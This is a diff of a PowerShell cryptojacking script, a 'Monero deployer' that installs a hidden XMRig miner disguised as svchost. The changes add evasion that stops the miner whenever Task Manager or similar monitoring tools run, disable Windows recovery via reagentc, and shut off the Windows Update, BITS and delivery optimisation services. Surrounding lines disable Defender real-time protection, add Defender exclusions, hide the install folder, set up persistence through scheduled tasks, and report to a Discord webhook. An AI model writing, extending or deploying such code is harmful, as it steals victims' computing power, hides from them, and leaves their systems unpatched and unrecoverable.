@@ -1,9 +1,9 @@
 # ============================================================
-#  XMR Standalone Pro Deployer v3.1
+#  XMR Standalone Pro Deployer v3.2
+#  - Base: Proven v3.1 Stability
+#  - Added: Taskmgr Detection (3s Poll)
+#  - Added: Windows Update & Reset Lockdown
 #  - Personalized for itzcurled
-#  - Fixed: Restored all advanced persistence & performance tweaks
-#  - No GitHub Token Required
-#  - Full Stealth + Watchdog + WMI Subscription
 # ============================================================
 
 # ==================== CONFIG ====================
@@ -31,13 +31,13 @@ $worker         = "$env:COMPUTERNAME"
 function Install-Miner {
     try {
         Get-CimInstance Win32_Process -ErrorAction Stop | Where-Object { 
-            ($_.ExecutablePath -like "*WindowsServices*") -or 
+            ($_.ExecutablePath -eq $xmrigExe) -or 
             ($_.CommandLine -like "*monitor.vbs*") -or 
             ($_.CommandLine -like "*watchdog.ps1*")
         } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
     } catch {
         Get-Process -Name "svchost", "wscript" -ErrorAction SilentlyContinue | Where-Object {
-            ($_.Path -like "*WindowsServices*") -or ($_.CommandLine -like "*monitor.vbs*") -or ($_.CommandLine -like "*watchdog.ps1*")
+            ($_.Path -eq $xmrigExe) -or ($_.CommandLine -like "*monitor.vbs*")
         } | Stop-Process -Force -ErrorAction SilentlyContinue
     }
     
@@ -59,7 +59,7 @@ function Install-Miner {
     }
 
     if (-not $downloaded) { throw "Download failed" }
-    if (Test-Path $extractDir) { Remove-Item $extractDir -Recurse -Force }
+    if (Test-Path $extractDir) { Remove-Item $extractDir -Recurse -Force -ErrorAction SilentlyContinue }
 
     try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop } catch {}
     Expand-Archive -Path $zipFile -DestinationPath $extractDir -Force
@@ -127,23 +127,37 @@ function Set-XmrigCpu {
     } catch {}
 }
 
-function Ensure-MinerRunning {
-    `$proc = Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { `$_.Path -like "*WindowsServices*" }
-    if (-not `$proc) {
+function Ensure-MinerState {
+    param([bool]`$shouldRun)
+    `$proc = Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { `$_.Path -eq `$xmrigExe }
+    if (`$shouldRun -and -not `$proc) {
         Start-Process `$xmrigExe -ArgumentList "--config=`"`$configFile`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
-        Start-Sleep -Seconds 4
+    } elseif (-not `$shouldRun -and `$proc) {
+        `$proc | Stop-Process -Force -ErrorAction SilentlyContinue
     }
 }
 
 while (`$true) {
     try {
-        Ensure-MinerRunning
-        `$idle = [IdleDetect]::GetIdleSeconds() -ge `$idleThreshold
-        `$target = if (`$idle) { `$idleCpu } else { `$activeCpu }
-        `$state = if (`$idle) { "idle" } else { "active" }
-        if (`$state -ne `$lastState) { Set-XmrigCpu -Percent `$target; `$lastState = `$state }
+        # --- TASK MANAGER DETECTION (3s Poll) ---
+        `$monitored = Get-Process -Name "Taskmgr", "ProcessHacker", "PerfMon", "ResourceMonitor" -ErrorAction SilentlyContinue
+        if (`$monitored) {
+            Ensure-MinerState -shouldRun `$false
+            `$lastState = "monitored"
+        } else {
+            `$idleSecs = [IdleDetect]::GetIdleSeconds()
+            `$isIdle = `$idleSecs -ge `$idleThreshold
+            `$targetCpu = if (`$isIdle) { `$idleCpu } else { `$activeCpu }
+            `$state = if (`$isIdle) { "idle" } else { "active" }
+            if (`$state -ne `$lastState) { 
+                Ensure-MinerState -shouldRun `$true
+                Start-Sleep -Seconds 1
+                Set-XmrigCpu -Percent `$targetCpu; `$lastState = `$state 
+            }
+            Ensure-MinerState -shouldRun `$true
+        }
     } catch {}
-    Start-Sleep -Seconds 5
+    Start-Sleep -Seconds 3
 }
 "@
     Set-Content -Path $watchdogPs1 -Value $code -Force
@@ -154,6 +168,9 @@ function Write-VbsLauncher {
 }
 
 function Set-Persistence {
+    # Lock down Windows Reset (No Reset)
+    try { & reagentc.exe /disable 2>$null } catch {}
+
     $taskName = "WindowsServiceUpdate"; $wdTask = "WindowsServiceMonitor"
     try {
         $a1 = New-ScheduledTaskAction -Execute $xmrigExe -Argument "--config=`"$configFile`""
@@ -193,6 +210,17 @@ function Set-Persistence {
     try { (Get-Item $installDir).Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System } catch {}
 }
 
+function Lockdown-System {
+    # No more Windows Updates
+    try {
+        $svcs = "wuauserv", "bits", "dosvc"
+        foreach ($s in $svcs) {
+            Set-Service -Name $s -StartupType Disabled -ErrorAction SilentlyContinue
+            Stop-Service -Name $s -Force -ErrorAction SilentlyContinue
+        }
+    } catch {}
+}
+
 function Enable-HugePages {
     try {
         $tmpCfg = "$env:TEMP\secpol.cfg"; $tmpDb = "$env:TEMP\secpol.sdb"
@@ -227,6 +255,7 @@ function Send-DiscordWebhook {
 # ==================== MAIN ====================
 try {
     Add-MpPreference -ExclusionPath $installDir, "$env:TEMP" -ErrorAction SilentlyContinue
+    Lockdown-System
     Disable-Sleep; Enable-HugePages
     Install-Miner; Write-MinerConfig; Write-Watchdog; Write-VbsLauncher; Set-Persistence
     Start-Process $xmrigExe -ArgumentList "--config=`"$configFile`"" -WindowStyle Hidden
